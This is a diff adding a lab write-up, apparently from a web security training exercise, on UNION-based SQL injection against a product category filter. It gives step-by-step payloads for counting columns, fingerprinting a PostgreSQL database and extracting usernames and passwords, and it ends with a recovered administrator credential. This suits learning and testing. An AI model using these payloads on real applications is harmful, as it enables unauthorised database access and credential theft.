@@ -1,0 +1,48 @@
+SQL Injection: Product Category Filter
+
+End goals:
+
+- Retrieve all usernames and passwords from the users table
+- Login as administrator usernames
+
+ANALYSIS
+---------
+
+Test if the category filter is vulnerable by using SQLi character like '
+
+1. First determine the number of columns that the vulnerable query is using
+
+' order by 1--  # 200 response code => Column exist but not displayed on the page (Possibly database ID column)
+' order by 2--  # 200 response code => Column exists & is displayed on the page
+' order by 3--  # Internal Server Error => Column doesn't exist
+
+This means the table has 2 columns only. We can only use column 2 since it's displaying on the page
+
+2. Determine which columns contains data of type text/string
+
+' UNION select 'a', NULL--  # Error => Column doesn't accept data type text/string
+' UNION select NULL, 'a'--  # 200 response code => Column accepts data type text/string
+
+3. Output data from another table (users table in this case)
+
+Notice that we can only use one column to output data, however we need to output data from 2 columns (usernames & passwords)
+
+- We can try to output each column one at a time
+
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+- We can also combine the output into one query using string concantenation. We will however need to determine the database type first.
+
+' UNION select NULL, @@version-- # Error => Probably not using Microsoft database type
+' UNION select NULL, version()-- # 200 response code => Application is using PostgreSQL database
+"PostgreSQL 11.12 (Debian 11.12-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit"
+
+- We will now use string concatenation syntax for PostgreSQL
+
+' UNION select NULL, username || password from users--
+' UNION select NULL, username || ': ' || password from users-- # You can add a separator '-' to separate usernames from the passwords
+
+We get the below:
+
+administrator: d38aeqxdozziq5vav9oy
